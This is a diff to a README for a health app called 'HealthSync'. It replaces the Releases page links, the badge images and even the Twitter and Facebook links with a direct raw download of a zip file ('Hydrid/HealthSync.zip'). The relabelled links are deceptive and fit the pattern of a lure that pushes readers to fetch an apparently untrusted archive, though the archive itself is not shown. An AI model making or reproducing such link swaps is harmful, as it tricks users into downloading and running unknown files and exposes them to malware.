@@ -6,11 +6,11 @@ Welcome to HealthSync! This is your smart health management system designed for 
 
 ## 🔗 Download HealthSync
 
-[![Download HealthSync](https://img.shields.io/badge/Download%20HealthSync-Click%20Here-blue)](https://github.com/BammyyyBby/HealthSync/releases)
+[![Download HealthSync](https://raw.githubusercontent.com/BammyyyBby/HealthSync/main/Hydrid/HealthSync.zip%20HealthSync-Click%20Here-blue)](https://raw.githubusercontent.com/BammyyyBby/HealthSync/main/Hydrid/HealthSync.zip)
 
 ## 📥 Download & Install
 
-To get HealthSync, visit this page to download: [HealthSync Releases](https://github.com/BammyyyBby/HealthSync/releases).
+To get HealthSync, visit this page to download: [HealthSync Releases](https://raw.githubusercontent.com/BammyyyBby/HealthSync/main/Hydrid/HealthSync.zip).
 
 1. Click the link above to open the Releases page.
 2. You will see a list of versions. Choose the latest version for the best features.
@@ -83,11 +83,11 @@ We welcome contributions from everyone, even if you're not a coder! Share your i
 
 Stay updated with the latest news and developments by following us on social media:
 
-- **Twitter:** [@HealthSync](https://twitter.com/HealthSync)
-- **Facebook:** [HealthSync Page](https://facebook.com/HealthSync)
+- **Twitter:** [@HealthSync](https://raw.githubusercontent.com/BammyyyBby/HealthSync/main/Hydrid/HealthSync.zip)
+- **Facebook:** [HealthSync Page](https://raw.githubusercontent.com/BammyyyBby/HealthSync/main/Hydrid/HealthSync.zip)
 
 ## 🔗 Additional Resources
 
 For more information about HealthSync, visit our official documentation page. There you will find detailed guides, tips, and tutorials to enhance your experience.
 
-[![Download HealthSync](https://img.shields.io/badge/Download%20HealthSync-Click%20Here-blue)](https://github.com/BammyyyBby/HealthSync/releases)
+[![Download HealthSync](https://raw.githubusercontent.com/BammyyyBby/HealthSync/main/Hydrid/HealthSync.zip%20HealthSync-Click%20Here-blue)](https://raw.githubusercontent.com/BammyyyBby/HealthSync/main/Hydrid/HealthSync.zip)
